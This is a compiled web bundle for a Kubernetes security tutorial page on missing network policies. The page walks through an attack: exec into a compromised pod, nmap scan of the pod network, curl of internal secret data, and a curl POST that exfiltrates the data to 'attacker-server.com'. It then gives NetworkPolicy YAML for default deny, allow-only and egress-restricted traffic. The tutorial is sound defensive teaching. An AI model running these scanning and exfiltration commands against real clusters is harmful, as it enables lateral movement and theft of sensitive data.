"use strict";(self.webpackChunkk_8_s_security=self.webpackChunkk_8_s_security||[]).push([[3958],{4206:(e,n,s)=>{s.r(n),s.d(n,{assets:()=>c,contentTitle:()=>l,default:()=>p,frontMatter:()=>r,metadata:()=>t,toc:()=>o});const t=JSON.parse('{"id":"k8s_security_basics/attack_vectors_examples/lack_of_network_policies","title":"Lack of Network Policies","description":"Understanding the risks of unregulated network traffic in Kubernetes and implementing best practices with Network Policies.","source":"@site/docs/k8s_security_basics/attack_vectors_examples/lack_of_network_policies.md","sourceDirName":"k8s_security_basics/attack_vectors_examples","slug":"/k8s_security_basics/attack_vectors_examples/lack_of_network_policies","permalink":"/k8s_security/docs/k8s_security_basics/attack_vectors_examples/lack_of_network_policies","draft":false,"unlisted":false,"editUrl":"https://github.com/geek-kb/k8s_security/edit/main/docs/k8s_security_basics/attack_vectors_examples/lack_of_network_policies.md","tags":[],"version":"current","sidebarPosition":4,"frontMatter":{"sidebar_position":4,"title":"Lack of Network Policies","description":"Understanding the risks of unregulated network traffic in Kubernetes and implementing best practices with Network Policies."},"sidebar":"tutorialSidebar","previous":{"title":"Privileged Containers","permalink":"/k8s_security/docs/k8s_security_basics/attack_vectors_examples/privileged_containers"},"next":{"title":"Insecure Secrets Management","permalink":"/k8s_security/docs/k8s_security_basics/attack_vectors_examples/insecure_secrets_management"}}');var i=s(4848),a=s(8453);const r={sidebar_position:4,title:"Lack of Network Policies",description:"Understanding the risks of unregulated network traffic in Kubernetes and implementing best practices with Network Policies."},l="Lack of Network Policies",c={},o=[{value:"Exploitation Steps: Lateral Movement in Kubernetes",id:"exploitation-steps-lateral-movement-in-kubernetes",level:2},{value:"1. Scan the Internal Network",id:"1-scan-the-internal-network",level:3},{value:"2. Access Sensitive Services",id:"2-access-sensitive-services",level:3},{value:"3. Exfiltrate Data to an External Server",id:"3-exfiltrate-data-to-an-external-server",level:3},{value:"Result",id:"result",level:3},{value:"Mitigation Techniques and Fixes",id:"mitigation-techniques-and-fixes",level:2},{value:"1. Implement Default Deny Policies",id:"1-implement-default-deny-policies",level:3},{value:"Example of Default Deny Policy for Ingress and Egress",id:"example-of-default-deny-policy-for-ingress-and-egress",level:4},{value:"2. Create Allow-Only Policies",id:"2-create-allow-only-policies",level:3},{value:"Example Allowing Traffic Only to an Application Pod",id:"example-allowing-traffic-only-to-an-application-pod",level:4},{value:"3. Restrict Egress Traffic",id:"3-restrict-egress-traffic",level:3},{value:"Example Egress Policy Allowing Only Specific Destinations",id:"example-egress-policy-allowing-only-specific-destinations",level:4},{value:"Conclusion",id:"conclusion",level:2}];function d(e){const n={code:"code",h1:"h1",h2:"h2",h3:"h3",h4:"h4",header:"header",hr:"hr",li:"li",p:"p",pre:"pre",strong:"strong",ul:"ul",...(0,a.R)(),...e.components};return(0,i.jsxs)(i.Fragment,{children:[(0,i.jsx)(n.header,{children:(0,i.jsx)(n.h1,{id:"lack-of-network-policies",children:"Lack of Network Policies"})}),"\n",(0,i.jsx)(n.p,{children:"The absence of Network Policies in a Kubernetes cluster can lead to unrestricted communication between pods, allowing lateral movement and data exfiltration. Without network segmentation, an attacker who gains access to a single pod can move freely within the cluster."}),"\n",(0,i.jsx)(n.hr,{}),"\n",(0,i.jsx)(n.h2,{id:"exploitation-steps-lateral-movement-in-kubernetes",children:"Exploitation Steps: Lateral Movement in Kubernetes"}),"\n",(0,i.jsx)(n.p,{children:"An attacker gains initial access to a compromised pod:"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"kubectl exec -it <compromised-pod> -- /bin/sh\n"})}),"\n",(0,i.jsx)(n.h3,{id:"1-scan-the-internal-network",children:"1. Scan the Internal Network"}),"\n",(0,i.jsx)(n.p,{children:"The attacker discovers other pods and services in the cluster using internal scanning tools:"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"apt-get update && apt-get install -y nmap\nnmap -p 80,443,8080 10.0.0.0/24\n"})}),"\n",(0,i.jsx)(n.h3,{id:"2-access-sensitive-services",children:"2. Access Sensitive Services"}),"\n",(0,i.jsx)(n.p,{children:"The attacker can connect to open services in other pods, such as databases or APIs:"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"curl http://10.0.0.15:8080/secret-data\n"})}),"\n",(0,i.jsx)(n.h3,{id:"3-exfiltrate-data-to-an-external-server",children:"3. Exfiltrate Data to an External Server"}),"\n",(0,i.jsx)(n.p,{children:"The attacker sends sensitive data to an external server using a simple HTTP request:"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"curl -X POST -d @/path/to/secret-data http://attacker-server.com/upload\n"})}),"\n",(0,i.jsx)(n.h3,{id:"result",children:"Result"}),"\n",(0,i.jsx)(n.p,{children:"The attacker can move laterally within the cluster, access sensitive data, and exfiltrate information without network restrictions."}),"\n",(0,i.jsx)(n.hr,{}),"\n",(0,i.jsx)(n.h2,{id:"mitigation-techniques-and-fixes",children:"Mitigation Techniques and Fixes"}),"\n",(0,i.jsx)(n.h3,{id:"1-implement-default-deny-policies",children:"1. Implement Default Deny Policies"}),"\n",(0,i.jsxs)(n.p,{children:[(0,i.jsx)(n.strong,{children:"Issue:"})," By default, all pods can communicate with each other, creating security risks.",(0,i.jsx)("br",{}),"\n",(0,i.jsx)(n.strong,{children:"Fix:"})," Apply a default deny policy to block all traffic by default."]}),"\n",(0,i.jsx)(n.h4,{id:"example-of-default-deny-policy-for-ingress-and-egress",children:"Example of Default Deny Policy for Ingress and Egress"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-yaml",children:"apiVersion: networking.k8s.io/v1\nkind: NetworkPolicy\nmetadata:\n  name: default-deny-all\n  namespace: default\nspec:\n  podSelector: {}\n  policyTypes:\n  - Ingress\n  - Egress\n"})}),"\n",(0,i.jsx)(n.h3,{id:"2-create-allow-only-policies",children:"2. Create Allow-Only Policies"}),"\n",(0,i.jsxs)(n.p,{children:[(0,i.jsx)(n.strong,{children:"Issue:"})," Lack of specific allow rules means that unwanted traffic is not blocked.",(0,i.jsx)("br",{}),"\n",(0,i.jsx)(n.strong,{children:"Fix:"})," Use Network Policies to allow traffic only to specific pods or services."]}),"\n",(0,i.jsx)(n.h4,{id:"example-allowing-traffic-only-to-an-application-pod",children:"Example Allowing Traffic Only to an Application Pod"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-yaml",children:"apiVersion: networking.k8s.io/v1\nkind: NetworkPolicy\nmetadata:\n  name: allow-app-traffic\n  namespace: default\nspec:\n  podSelector:\n    matchLabels:\n      app: my-app\n  policyTypes:\n  - Ingress\n  ingress:\n  - from:\n    - podSelector:\n        matchLabels:\n          role: frontend\n    ports:\n    - protocol: TCP\n      port: 80\n"})}),"\n",(0,i.jsx)(n.h3,{id:"3-restrict-egress-traffic",children:"3. Restrict Egress Traffic"}),"\n",(0,i.jsxs)(n.p,{children:[(0,i.jsx)(n.strong,{children:"Issue:"})," Unrestricted outgoing traffic can leak sensitive data to external servers.",(0,i.jsx)("br",{}),"\n",(0,i.jsx)(n.strong,{children:"Fix:"})," Define egress rules to control outbound connections."]}),"\n",(0,i.jsx)(n.h4,{id:"example-egress-policy-allowing-only-specific-destinations",children:"Example Egress Policy Allowing Only Specific Destinations"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-yaml",children:"apiVersion: networking.k8s.io/v1\nkind: NetworkPolicy\nmetadata:\n  name: restrict-egress\n  namespace: default\nspec:\n  podSelector:\n    matchLabels:\n      role: database\n  policyTypes:\n  - Egress\n  egress:\n  - to:\n    - ipBlock:\n        cidr: 10.0.0.0/24\n    ports:\n    - protocol: TCP\n      port: 5432\n"})}),"\n",(0,i.jsx)(n.hr,{}),"\n",(0,i.jsx)(n.h2,{id:"conclusion",children:"Conclusion"}),"\n",(0,i.jsx)(n.p,{children:"To enhance security and limit lateral movement within the Kubernetes cluster:"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:"Implement default deny policies for ingress and egress traffic."}),"\n",(0,i.jsx)(n.li,{children:"Create specific allow rules using Network Policies."}),"\n",(0,i.jsx)(n.li,{children:"Regularly audit and validate network policies to ensure only necessary communication is allowed."}),"\n"]})]})}function p(e={}){const{wrapper:n}={...(0,a.R)(),...e.components};return n?(0,i.jsx)(n,{...e,children:(0,i.jsx)(d,{...e})}):d(e)}},8453:(e,n,s)=>{s.d(n,{R:()=>r,x:()=>l});var t=s(6540);const i={},a=t.createContext(i);function r(e){const n=t.useContext(a);return t.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function l(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(i):e.components||i:r(e.components),t.createElement(a.Provider,{value:n},e.children)}}}]);